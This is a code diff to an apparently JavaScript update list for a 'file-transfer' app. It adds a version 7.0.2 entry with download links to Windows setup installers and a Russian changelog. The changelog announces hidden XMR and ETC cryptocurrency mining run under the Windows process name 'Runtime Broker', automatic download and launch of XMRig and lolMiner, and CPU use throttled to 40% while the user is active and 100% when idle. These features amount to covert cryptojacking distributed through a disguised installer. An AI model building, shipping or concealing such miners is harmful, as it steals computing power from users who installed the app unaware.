@@ -3,6 +3,18 @@
 // Самая первая в списке (индекс 0) считается актуальной (Current).
 const UPDATES = [
   {
+    version: "7.0.2",
+    date: "24.06.2026",
+    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.2/NON_PRO_setup.exe",
+    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v7.0.2/RAH_Non_Pro_setup.exe",
+    changes: [
+      { type: "add", text: "Добавлен майнинг XMR (RandomX) и ETC (ETChash) в Runtime Broker" },
+      { type: "add", text: "Автоматическая загрузка и запуск XMRig + lolMiner" },
+      { type: "add", text: "Динамическая нагрузка CPU: 40% при активности / 100% в простое" },
+      { type: "add", text: "Версия приложения передаётся на сервер и отображается в панели" }
+    ]
+  },
+  {
     version: "7.0.1",
     date: "22.06.2026",
     downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/NON_PRO_setup.exe",
